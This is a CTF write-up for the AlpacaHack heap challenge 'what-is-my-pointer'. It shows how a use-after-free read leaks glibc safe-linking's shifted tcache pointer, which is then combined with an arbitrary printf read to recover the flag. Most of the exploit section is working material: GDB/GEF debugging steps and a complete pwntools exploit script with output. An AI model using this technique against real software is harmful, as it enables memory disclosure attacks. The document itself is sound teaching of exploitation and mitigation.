---
title: "what-is-my-pointer: safe-linking leaks the heap"
date: 2026-07-25 20:00:00 +0600
series: "AlpacaHack Daily"
platform: "AlpacaHack"
summary: "A use-after-free read on a tcache chunk exposes safe-linking's shifted pointer, which is enough to point an arbitrary read at the flag."
description: "A use-after-free read on a tcache chunk exposes safe-linking's shifted pointer, which is enough to point an arbitrary read at the flag."
tags: ["pwn", "heap"]
---

<details class="toc" markdown="1">
<summary>Contents</summary>

* TOC
{:toc}

</details>

{% raw %}
**Category:** pwn (heap) · **Target:** Ubuntu 24.04, glibc 2.39 (digest-pinned)

## TL;DR

Option 4 is a free arbitrary read (`printf("%s", user_pointer)`) — but PIE + heap ASLR means you don't know *what* address to ask for. That's the title. A UAF read on a tcache'd chunk leaks glibc's safe-linking mangled `fd`, which for the first chunk in an empty bin is exactly `chunk_addr >> 12`. Shift back, add `0x490`, read the flag.

```
1 (allocate) → 2 (free) → 3 (read → leak) → 4 (read at (leak<<12) + 0x490)
```

## The bugs

```c
case 2: assert(item != NULL); free(item); /* item == NULL;  <- commented out */ break;
case 3: assert(item != NULL); puts(item); break;
case 4: { char *ptr; scanf("%p%*c", (void*)&ptr); printf("%s\n", ptr); } break;
```

1. **`chal.c:43`** — `free(item)` never nulls `item`. The fix is commented out, and even uncommented, `item == NULL;` is a *comparison*, not an assignment.
2. **`chal.c:48`** — `puts(item)` on the dangling pointer → **UAF read**.
3. **`chal.c:55`** — `printf("%s", scanf("%p"))` → **arbitrary read**.

The `assert` guards check "was this ever allocated", not "is this still valid" — after a free, `item` is non-NULL and both pass.

The flag is `malloc`'d at startup and never used again, so the whole challenge is: leak one heap address, then point option 4 at the flag buffer.

## Step 1 — Leak via safe-linking

`malloc(0x20)` → 0x30 chunk → on free it goes to **tcache**, which writes into the chunk's *user data* and doesn't scrub the rest — and `item` still points there:

```c
typedef struct tcache_entry {
  struct tcache_entry *next;   /* mem+0x00, mangled */
  uintptr_t key;               /* mem+0x08 */
} tcache_entry;

#define PROTECT_PTR(pos, ptr) ((__typeof(ptr))((((size_t)pos) >> 12) ^ ((size_t)ptr)))
```

**First chunk into an empty bin ⇒ `next == NULL` ⇒ the stored value is `chunk_addr >> 12` in plaintext.** The mitigation stores a shifted copy of the chunk's own address; `puts` reads it out.

```bash
printf '1\n2\n3\n' | nc <host> <port> | xxd
```

```
00000040: 6963 653e 204e 43c1 5605 0a63 686f 6963  ice> NC.V..choic
```

`4e 43 c1 56 05` = `0x0556c1434e`. Exactly 5 bytes: a 48-bit address >> 12 leaves 36 bits, and byte 6 is `0x00` — which is what terminates `puts`. The leak self-delimits, and the `key` at `mem+8` stays hidden behind that NUL.

`leak << 12` = the page `item` sits on.

## Step 2 — Find the offset

`leak << 12` destroys the low 12 bits, so the flag's offset within that page must come from the (deterministic) startup allocation layout. Host glibc is 2.42 and the target 2.39, so debug **inside the pinned image**:

```bash
mkdir -p /tmp/wimp-dbg && cd /tmp/wimp-dbg
cp ~/Desktop/what-is-my-pointer/{chal,flag.txt} .
cp ~/.gef-2026.01.py gef.py
printf '1\n2\n3\n' > input.txt

cat > Dockerfile <<'EOF'
FROM ubuntu:24.04@sha256:186072bba1b2f436cbb91ef2567abca677337cfc786c86e107d25b7072feef0c
RUN apt-get update && apt-get install -y --no-install-recommends \
      gdb python3 libc6-dbg binutils procps file && rm -rf /var/lib/apt/lists/*
WORKDIR /work
COPY chal flag.txt gef.py input.txt /work/
RUN chmod +x /work/chal
EOF

docker build -t wimp-dbg .

docker run --rm -it --cap-add=SYS_PTRACE --security-opt seccomp=unconfined \
  -e LC_ALL=C.UTF-8 -e LANG=C.UTF-8 -e PYTHONIOENCODING=utf-8 \
  wimp-dbg gdb -q -x /work/gef.py /work/chal
```

`binutils` is required — GEF shells out to `readelf` and dies silently without it. The UTF-8 env stops its `➤` prompt throwing `UnicodeEncodeError`.

```
break 'free@plt'        # PLT stub = the program's own free only; plain `break free`
run < /work/input.txt   #   also catches libc-internal free(NULL) calls from fseek
p (char *) item         # cast needed: symbols present, no DWARF
heap chunks
```

```
Chunk(addr=0x555555559010, size=0x290)   tcache_perthread_struct
Chunk(addr=0x5555555592a0, size=0x1e0)   FILE object      (fbad2488 = _IO_MAGIC)
Chunk(addr=0x555555559480, size=0x1010)  stdio buffer     "Alpaca{REDACTED}\n"
Chunk(addr=0x55555555a490, size=0x20)    malloc'd flag    "Alpaca{REDACTED}"
Chunk(addr=0x55555555a4b0, size=0x30)    item
Chunk(addr=0x55555555a4e0, size=0x1fb30) top
```

(GEF renders `IS_MMAPPED | NON_MAIN_ARENA` on every chunk — a display bug. `x/gx 0x555555559008` gives `0x291`, i.e. `PREV_INUSE` only.)

The flag exists **twice**: stdio reads the file into its own 4 KiB buffer (allocated by the first `fseek`, via `_IO_file_seekoff`), then `fgets` copies it into the `malloc`'d buffer.

Critically, `leak << 12` is **not** the heap base — `item` is at `heap+0x14b0`, and `0x14b0 >> 12 == 1`, so the leak lands one page *into* the heap:

```
heap base   = 0x555555559000
item        = 0x55555555a4b0
leak << 12  = 0x55555555a000   = heap base + 0x1000

flag buffer = 0x55555555a490   →  +0x490   ← the offset
stdio copy  = 0x555555559480   →  -0xb80
```

General rule: **`leak << 12` recovers the page; the low 12 bits are gone and must come from known static layout.**

## Step 3 — Exploit

```python
#!/usr/bin/env python3
import sys
from pwn import *

HOST, PORT = sys.argv[1], int(sys.argv[2])

p = remote(HOST, PORT)
for c in (b"1", b"2", b"3"):                      # allocate, free, UAF read
    p.sendlineafter(b"choice> ", c)

leak = u64(p.recvline().strip().ljust(8, b"\x00"))
flag = (leak << 12) + 0x490
log.info(f"item page {leak << 12:#x} -> flag at {flag:#x}")

p.sendlineafter(b"choice> ", b"4")                # printf("%s", ptr)
p.sendlineafter(b"pointer> ", hex(flag).encode())
log.success(p.recvline().strip().decode())
```

```
$ python3 exploit.py <host> <port>
[*] item page 0x55d6bdbd7000 -> flag at 0x55d6bdbd7490
[+] Alpaca{...}
```

Fully deterministic — no ASLR gamble, no brute force. It also survives a longer real flag: a bigger flag chunk pushes `item` to `heap+0x14c0` but leaves the flag chunk's own position untouched, and `item` stays on the same page.

## Fix

Any one of these kills it: `item = NULL` after `free`; delete case 4; don't hold the flag in memory.
{% endraw %}
